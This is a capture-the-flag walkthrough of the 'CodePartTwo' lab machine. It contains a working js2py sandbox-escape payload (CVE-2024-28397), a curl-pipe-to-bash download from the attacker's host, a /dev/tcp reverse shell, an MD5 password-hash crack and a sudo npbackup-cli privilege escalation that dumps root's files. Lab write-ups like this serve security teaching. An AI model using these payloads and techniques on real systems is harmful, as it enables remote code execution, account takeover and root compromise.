
![[Pasted_image_20250904224053.png]]

## Recon

### Port scan

```bash
sudo nmap -Pn -sCV -p- --min-rate 2500 -T3 -oN codeparttwo-port-scan 10.10.11.82             
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 22:38 EAT
Warning: 10.10.11.82 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.82
Host is up (0.35s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.76 seconds                                                    
```

At port 8000 we have a web service running.

![[Pasted_image_20250909062820.png]]

we can also register and downlod the app.

The application runs JS code 
![[Pasted_image_20250909063236.png]]

i was getting the output and in burp i had this 

![[Pasted_image_20250909063320.png]]

I downloaded the app which came as a zip file.

```bash
──(darklight㉿jinx)-[~/…/ctf/htb/machines/codeparttwo]
└─$ unzip app.zip                                 
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css  
   creating: app/static/js/
  inflating: app/static/js/script.js  
  inflating: app/app.py              
   creating: app/templates/
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/templates/register.html  
  inflating: app/templates/login.html  
  inflating: app/requirements.txt    
   creating: app/instance/
  inflating: app/instance/users.db   
```

The users.db had nothing of interest but the app requirements pointed to more attack surface

```bash
cat app/requirements.txt                    
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

Our app is running on python but supports JS code execution via the js2py package.

Researching about it i got this

https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

and also a metasplloit variant of the same exploit. https://www.rapid7.com/db/modules/exploit/linux/http/pyload_js2py_cve_2024_39205/

## Gaining initial foothold

The exploits does not support authentication but we need to be authenticated in order to be able to run our payload. SO i just extracted the payload from the script and to text if it works i decide to performa call to our server.

```js
let cmd = "curl http://10.10.16.77:8000/text.txt; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```


```bash
 python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.82 - - [09/Sep/2025 07:33:00] code 404, message File not found
10.10.11.82 - - [09/Sep/2025 07:33:00] "GET /text.txt HTTP/1.1" 404 -
```

Let's get a reverse shell connection.

```bash
 echo '/bin/sh -i >& /dev/tcp/10.10.16.77/1337 0>&1' > rev.sh
```

Then modify the command to be 
```js
let cmd = "curl http://10.10.16.77:8000/rev.sh | bash "
```

we get a connection as `app`

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.77] from (UNKNOWN) [10.10.11.82] 35570
can't access tty; job control turned off
$ whoami
app
$ 
```

### Lateral Movement

we get access to the web app database and we have two users with md5 hash passwords 

```bash
app@codeparttwo:~/app/instance$ ccat /etc/passwd | grep 'sh$'
cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
app@codeparttwo:~/app/instance$ sqlite3 users.db
sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
code_snippet  user        
sqlite> select * from user;
select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
sqlite> 
```

using crack station i cracked the hash for marco
![[Pasted_image_20250909133756.png]]


using the password we are able to acess the machine through ssh as marco

```bash
marco@codeparttwo:~$ whoami
marco
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cat user.txt
c28ef1d59dd38494fe8a92618717d8cc
marco@codeparttwo:~$ 
```

### Privilege Escalation

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

we have one command we can run with root privileges

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
2025-09-09 10:43:03,459 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-09 10:43:03,460 :: CRITICAL :: Cannot run without configuration file.
2025-09-09 10:43:03,468 :: INFO :: ExecTime = 0:00:00.011746, finished, state is: critical.
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -h
optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current
                        dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be
                        a comma separated list of repo names. Can accept special name '__all__' to
                        work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name
                        '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a snapshot
                        other than latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and
                        'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune
                        reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by
                        --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump
                        [file], add --snapshot-id to specify a snapshot other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics
                        will be shown. You may also pass "--mode raw-data" or "--mode debug" (with
                        double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set
                        NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed
                        anymore. Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via
                        interval=minutes, or hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a
                        daily task
  --check-config-file   Check if config file is valid

```

3 options stand out 

```bash
--dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump
                        [file], add --snapshot-id to specify a snapshot other than latest

--raw RAW             Run raw command against backend. Use with --raw "my raw backend command"

--external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary

```

the last two does fail

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --raw 'cat /root/root.txt'
2025-09-09 11:08:16,200 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-09 11:08:16,231 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-09-09 11:08:16,243 :: INFO :: Running raw command: cat /root/root.txt
Fatal: invalid type "/root/root.txt", must be one of [config|index|snapshot|key|masterkey|lock|pack|blob|tree]
2025-09-09 11:08:17,319 :: ERROR :: Fatal: invalid type "/root/root.txt", must be one of [config|index|snapshot|key|masterkey|lock|pack|blob|tree]

2025-09-09 11:08:17,320 :: ERROR :: Raw command failed:
Fatal: invalid type "/root/root.txt", must be one of [config|index|snapshot|key|masterkey|lock|pack|blob|tree]

2025-09-09 11:08:17,320 :: INFO :: Runner took 1.078623 seconds for raw
2025-09-09 11:08:17,321 :: ERROR :: Backend finished with errors.
2025-09-09 11:08:17,321 :: ERROR :: Operation finished
2025-09-09 11:08:17,326 :: INFO :: ExecTime = 0:00:01.128989, finished, state is: errors.
marco@codeparttwo:~$ echo 'cat /root/root.txt' > back.sh
marco@codeparttwo:~$ chmod +x back.sh
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --external-backend-binary ./back.sh
Error: '--external-backend-binary' flag is restricted for use.
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --external-backend-binary ./back.sh -f
Error: '--external-backend-binary' flag is restricted for use.
```

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt
Fatal: cannot dump file: path "/root" not found in snapshot
```

trying to dump the root.txt file we are getting that the path `/root` is not found in the snapshot.

taking a look at how the backup occurs :

```bash
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf -b -f
2025-09-09 11:20:55,125 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-09 11:20:55,151 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
'2025-09-09 11:20:55,165 :: INFO :: Running backup of ['/home/app/app/'] to repo default'
2025-09-09 11:20:56,150 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-09-09 11:20:56,151 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found

[SNIP]
```

based on the logs of the tool.. we are only backing up this path `/home/app/app/`

checking at the configuration file we see the defined path.

```bash
marco@codeparttwo:~$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - '/home/app/app/'
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8
[SNIP]
```

making a copy of the backup file since we dont have write rights to the file .. then modify the path to point to /root

```bash
marco@codeparttwo:~$ cat back.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
```

Now we can backup the directory ("creating a snapshot") then we dump the root.txt file

```bash
marco@codeparttwo:~$ sudo npbackup-cli -c back.conf -b -f
2025-09-09 11:22:31,964 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-09 11:22:31,999 :: INFO :: Loaded config E1057128 in /home/marco/back.conf
2025-09-09 11:22:32,011 :: INFO :: Running backup of ['/root'] to repo default
2025-09-09 11:22:33,129 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-09-09 11:22:33,129 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-09-09 11:22:33,129 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes

[SNIP]
```

```bash
marco@codeparttwo:~$ sudo npbackup-cli -c back.conf -f --dump /root/root.txt
bed53e6f2667490c85dc6ee4a55ae33a
```

